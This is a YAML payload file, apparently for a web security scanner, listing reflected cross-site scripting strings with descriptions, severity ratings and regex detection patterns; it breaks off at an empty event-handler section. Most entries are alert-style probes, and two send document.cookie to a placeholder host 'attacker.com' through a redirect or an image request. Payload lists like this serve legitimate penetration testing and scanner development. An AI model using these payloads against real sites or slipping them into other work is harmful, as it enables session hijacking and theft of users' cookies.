metadata:
  type: xss/reflected
  version: "1.0"
  description: "Reflected XSS payloads for various contexts"
  sources: ["OWASP", "PortSwigger", "PayloadsAllTheThings", "BruteLogic"]

detection_patterns:
  - "<script[^>]*>.*?alert\\s*\\("
  - "on\\w+\\s*=\\s*['\"]?alert"
  - "javascript\\s*:\\s*alert"
  - "alert\\s*\\(.*?\\)"

payloads:
  basic:
    - value: "<script>alert(1)</script>"
      description: "Basic script tag XSS"
      severity: high
      tags: [basic, script]

    - value: "<script>alert('XSS')</script>"
      description: "Script tag with string"
      severity: high
      tags: [basic, script]

    - value: "<script>alert(document.cookie)</script>"
      description: "Cookie theft via alert"
      severity: high
      tags: [basic, script, cookie]

    - value: "<script>alert(String.fromCharCode(88,83,83))</script>"
      description: "String.fromCharCode bypass"
      severity: high
      tags: [basic, script, encoding]

    - value: "<script>alert`1`</script>"
      description: "Template literal alert"
      severity: high
      tags: [basic, script, template_literal]

    - value: "<script>alert(\\x31)</script>"
      description: "Hex escape alert param"
      severity: high
      tags: [basic, script, hex]

    - value: "<script>confirm(1)</script>"
      description: "Confirm instead of alert"
      severity: high
      tags: [basic, script]

    - value: "<script>prompt(1)</script>"
      description: "Prompt instead of alert"
      severity: high
      tags: [basic, script]

    - value: "<script>console.log('XSS')</script>"
      description: "Console log test"
      severity: medium
      tags: [basic, script]

    - value: "<script>document.location='http://attacker.com/?c='+document.cookie</script>"
      description: "Cookie exfiltration"
      severity: critical
      tags: [basic, script, exfiltration]

    - value: "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>"
      description: "Image-based exfiltration"
      severity: critical
      tags: [basic, script, exfiltration]

  event_handlers:
